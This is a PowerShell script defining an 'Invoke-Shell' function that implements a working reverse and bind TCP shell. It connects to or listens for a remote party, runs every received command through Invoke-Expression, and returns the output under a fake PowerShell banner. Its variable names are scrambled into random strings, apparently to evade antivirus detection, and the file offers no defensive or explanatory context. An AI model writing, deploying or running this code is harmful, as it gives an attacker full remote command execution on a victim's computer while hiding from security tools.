function Invoke-Shell 
{   
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $world,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $CountrY,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    try 
    {
        if ($Reverse)
        {
            $hfhgnjgjngfghfnh = New-Object System.Net.Sockets.TCPClient($world,$CountrY)
        }

        if ($Bind)
        {
            $6545643465465r = [System.Net.Sockets.TcpListener]$CountrY
            $6545643465465r.start()    
            $hfhgnjgjngfghfnh = $6545643465465r.AcceptTcpClient()
        } 

        $zertyuijhgf = $hfhgnjgjngfghfnh.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        $rtyhgffvbhjkloiujyhtgre567s = ([text.encoding]::ASCII).GetBytes("Windows PowerShell`nMicrosoft Corporation.`n`n")
        $zertyuijhgf.Write($rtyhgffvbhjkloiujyhtgre567s,0,$rtyhgffvbhjkloiujyhtgre567s.Length)

        $rtyhgffvbhjkloiujyhtgre567s = ([text.encoding]::ASCII).GetBytes('$ ' + (Get-Location).Path + '>>')
        $zertyuijhgf.Write($rtyhgffvbhjkloiujyhtgre567s,0,$rtyhgffvbhjkloiujyhtgre567s.Length)

        while(($i = $zertyuijhgf.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                $eghjklkjnbvc = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something wrong." 
                Write-Error $_
            }
            $eghjklkjnbvc2  = $eghjklkjnbvc + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $eghjklkjnbvc2 = $eghjklkjnbvc2 + $x

            $rtyhgffvbhjkloiujyhtgre567 = ([text.encoding]::ASCII).GetBytes($eghjklkjnbvc2)
            $zertyuijhgf.Write($rtyhgffvbhjkloiujyhtgre567,0,$rtyhgffvbhjkloiujyhtgre567.Length)
            $zertyuijhgf.Flush()  
        }
        $hfhgnjgjngfghfnh.Close()
        if ($6545643465465r)
        {
            $6545643465465r.Stop()
        }
    }
    catch
    {
        Write-Warning "Something wrong!" 
        Write-Error $_
    }
}

#Start-Sleep -s 6
